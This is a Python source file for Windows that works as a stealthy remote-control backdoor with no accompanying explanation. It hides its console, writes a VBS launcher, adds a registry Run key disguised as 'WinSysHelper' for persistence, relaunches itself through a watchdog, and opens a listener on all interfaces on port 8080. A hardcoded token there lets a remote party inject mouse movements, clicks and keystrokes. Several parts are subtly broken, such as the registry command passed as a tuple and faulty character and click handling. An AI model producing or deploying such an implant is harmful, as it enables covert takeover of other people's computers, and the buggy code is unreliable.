import os
import sys
import socket
import threading
import time
import subprocess
import ctypes
from ctypes import wintypes
user32 = ctypes.windll.user32
MEM, MELD, MELU = 0x0001, 0x0002, 0x0004
MERD, MERU, = 0x0008, 0x0010
KEKU = 0x0002
def mm(dx, dy):
    user32.mouse_event(MEM, dx, dy, 0, 0)
def c(bt="lft"):
    if bt == "lft":
        user32.mouse_event(MELD, 0, 0, 0, 0)
        user32.mouse_event(MELU, 0, 0, 0, 0)
    else:
        user32.mouse_event(MERD, 0, 0, 0, 0)
        user32.mouse_event(MERU, 0, 0, 0, 0)
def pk(vk):
    user32.keybd_event(vk, 0, 0, 0)
    user32.keybd_event(vk, 0, KEKU, 0)
VKM = {
    "EN": 0x0D, "EX": 0x1B, "TB": 0x09, "GALAXY": 0x20,
    "BSP": 0x08, "HIGH": 0x26, "LOW": 0x28, "LEFT": 0x25, "RIGHT": 0x27,
    "WIN": 0x5B, "WISH": 0x11, "LAT": 0x12, "SHAPE": 0x10,
}
def tt(txt):
    for ch in txt:
        vk = user32.VkKeyScanW(chr(ch)) & 0xFF
        if vk != 0xFF:
            pk(vk)
def sp():
    return os.path.abspath(sys.argv[0])
def instper():
    vbs = os.path.join(os.path.dirname(sp()), "itsme.vbs")
    regcmd = ('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" ', '/v "WinSysHelper" /t REG_SZ /d "wscript.exe //B \\"' + vbs + '\\"" /f')
    try:
        subprocess.run(regcmd, shell=True, capture_output=True)
    except Exception:
        pass
def wvbs():
    vbs = os.path.join(os.path.dirname(sp()), "itsme.vbs")
    pyw = sys.executable.replace("python.exe", "pythonw.exe")
    if not os.path.exists(pyw):
        pyw = sys.executable
    content = f'CreateObject("WScript.Shell").Run """{pyw}"" ""{sp()}""", 0, False\n'
    with open(vbs, "w") as f:
        f.write(content)
def wolf():
    while True:
        time.sleep(20)
        s = socket.socket()
        try:
            s.settimeout(0.5)
            s.connect(("127.0.0.1", P))
            s.close()
        except Exception:
            subprocess.Popen([sys.executable, sp()], creationflags=0x00000008)
        finally:
            s.close
AT = "ITSME"
def hc(conn):
    try:
        f = conn.makefile("r", encoding="utf-8", errors="ignore")
        a = False
        for line in f:
            line = line.strip()
            if not line:
                continue
            if not a:
                if line == "AUTH:" +  AT:
                    a = True
                    conn.sendall(b"OK\n")
                else:
                    conn.sendall(b"ERR:AUTH\n")
                    return
                continue
            parts = line.split(":", 1)
            cmd = parts[0].upper()
            arg =parts[1] if len(parts) > 1 else ""
            try:
                if cmd == "MOVE":
                    x, y = map(int, arg.split(","))
                    mm(x, y)
                elif cmd == "CLICK":
                    c("right" if arg == "R" else "left")
                elif cmd == "KEY":
                    pk(VKM.get(arg.upper(), int(arg) if arg.isdigit() else 0))
                elif cmd == "TYPE":
                    tt(arg)
                conn.sendall(b"OK\n")
            except Exception as e:
                conn.sendall(f"ERR:{e}\n".encode())
    finally:
        conn.close()
def serve(p):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", p))
    srv.listen(5)
    while True:
        conn, _ = srv.accept()
        threading.Thread(target=hc, args=(conn,), daemon=True).start()
P = 8080
if __name__  == "__main__":
    if sys.platform == "win32":
        hwnd = user32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
    wvbs()
    instper()
    threading.Thread(target=wolf, daemon=True).start()
    serve(P)